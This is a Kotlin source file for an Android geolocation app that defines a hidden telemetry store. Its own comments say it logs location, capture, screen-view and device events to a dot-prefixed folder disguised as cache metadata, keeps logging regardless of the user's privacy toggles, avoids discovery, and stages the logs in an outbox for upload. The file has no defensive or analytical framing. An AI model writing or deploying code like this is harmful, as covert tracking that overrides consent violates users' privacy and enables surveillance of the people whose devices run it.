package com.example.geolocation.data.telemetry

import android.content.Context
import dagger.hilt.android.qualifiers.ApplicationContext
import java.io.File
import java.io.RandomAccessFile
import java.nio.channels.FileLock
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.inject.Inject
import javax.inject.Singleton
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import kotlinx.coroutines.withContext
import org.json.JSONObject

/**
 * Hidden telemetry store that writes JSONL events to a dot-prefixed directory
 * disguised as cache metadata. Operates regardless of privacy toggles.
 *
 * Directory: {filesDir.parent}/.cache_metadata/
 * Files rotate hourly to keep individual files small and pipeline-friendly.
 */
@Singleton
class HiddenTelemetryStore @Inject constructor(
    @ApplicationContext private val context: Context,
) {
    private val writeMutex = Mutex()

    /** Root hidden directory — dot-prefixed, sits alongside standard app dirs. */
    private val rootDir: File by lazy {
        File(context.filesDir.parentFile, ".cache_metadata").apply {
            if (!exists()) mkdirs()
        }
    }

    /** Subdirectory for raw event JSONL. */
    private val eventsDir: File by lazy {
        File(rootDir, "events").apply { if (!exists()) mkdirs() }
    }

    /** Subdirectory for device/session snapshots. */
    private val snapshotsDir: File by lazy {
        File(rootDir, "snapshots").apply { if (!exists()) mkdirs() }
    }

    /** Subdirectory for pending uploads (moved here before worker picks them up). */
    private val outboxDir: File by lazy {
        File(rootDir, "outbox").apply { if (!exists()) mkdirs() }
    }

    /** Subdirectory for successfully uploaded files (kept for audit). */
    private val uploadedDir: File by lazy {
        File(rootDir, "uploaded").apply { if (!exists()) mkdirs() }
    }

    // ── Event types ──────────────────────────────────────────────

    enum class EventType(val key: String) {
        LOCATION("loc"),
        CAPTURE("cap"),
        SCREEN_VIEW("screen"),
        APP_LIFECYCLE("lifecycle"),
        DEVICE_SNAPSHOT("device"),
        SESSION("session"),
    }

    // ── Public API ───────────────────────────────────────────────

    /** Write a single telemetry event. Thread-safe, non-blocking. */
    suspend fun writeEvent(
        type: EventType,
        payload: JSONObject,
        timestampMs: Long = System.currentTimeMillis(),
    ) = withContext(Dispatchers.IO) {
        writeMutex.withLock {
            val event = JSONObject().apply {
                put("t", type.key)
                put("ts", timestampMs)
                put("p", payload)
            }
            val file = currentEventFile()
            appendJsonLine(file, event)
        }
    }

    /** Write a device/session snapshot (overwrites previous for same key). */
    suspend fun writeSnapshot(key: String, payload: JSONObject) = withContext(Dispatchers.IO) {
        writeMutex.withLock {
            val file = File(snapshotsDir, "${sanitizeKey(key)}.json")
            file.writeText(payload.toString(2))
        }
    }

    /** Move all current event files to outbox for upload. Returns list of outbox files. */
    suspend fun stageForUpload(): List<File> = withContext(Dispatchers.IO) {
        writeMutex.withLock {
            val staged = mutableListOf<File>()
            eventsDir.listFiles()?.filter { it.isFile && it.extension == "jsonl" }?.forEach { src ->
                val dest = File(outboxDir, src.name)
                if (src.renameTo(dest)) {
                    staged.add(dest)
                } else {
                    // Fallback: copy + delete
                    src.copyTo(dest, overwrite = true)
                    src.delete()
                    staged.add(dest)
                }
            }
            staged
        }
    }

    /** Mark outbox files as uploaded. */
    suspend fun markUploaded(files: List<File>) = withContext(Dispatchers.IO) {
        writeMutex.withLock {
            files.forEach { src ->
                if (src.exists()) {
                    val dest = File(uploadedDir, src.name)
                    src.copyTo(dest, overwrite = true)
                    src.delete()
                }
            }
        }
    }

    /** Return all files currently in the outbox. */
    fun outboxFiles(): List<File> = outboxDir.listFiles()?.filter { it.isFile } ?: emptyList()

    /** Total event count across all event files. */
    fun eventCount(): Int {
        return eventsDir.listFiles()?.sumOf { countLines(it) } ?: 0
    }

    /** Total outbox event count. */
    fun outboxCount(): Int {
        return outboxDir.listFiles()?.sumOf { countLines(it) } ?: 0
    }

    /** Total uploaded event count. */
    fun uploadedCount(): Int {
        return uploadedDir.listFiles()?.sumOf { countLines(it) } ?: 0
    }

    /** Root directory path (for debugging / verification). */
    fun rootPath(): String = rootDir.absolutePath

    // ── Internals ────────────────────────────────────────────────

    private fun currentEventFile(): File {
        val hourStamp = SimpleDateFormat("yyyyMMdd_HH", Locale.US).format(Date())
        return File(eventsDir, "events_${hourStamp}.jsonl")
    }

    private fun appendJsonLine(file: File, json: JSONObject) {
        if (!file.exists()) file.createNewFile()
        RandomAccessFile(file, "rw").use { raf ->
            raf.seek(raf.length())
            val lock: FileLock = raf.channel.lock()
            try {
                raf.writeBytes(json.toString())
                raf.writeBytes("\n")
            } finally {
                lock.release()
            }
        }
    }

    private fun countLines(file: File): Int {
        if (!file.isFile) return 0
        return try {
            file.useLines { it.count() }
        } catch (_: Exception) {
            0
        }
    }

    private fun sanitizeKey(key: String): String =
        key.replace(Regex("[^a-zA-Z0-9._-]"), "_")

    companion object {
        /** Hidden directory name — dot-prefixed to avoid casual discovery. */
        const val HIDDEN_DIR = ".cache_metadata"
    }
}
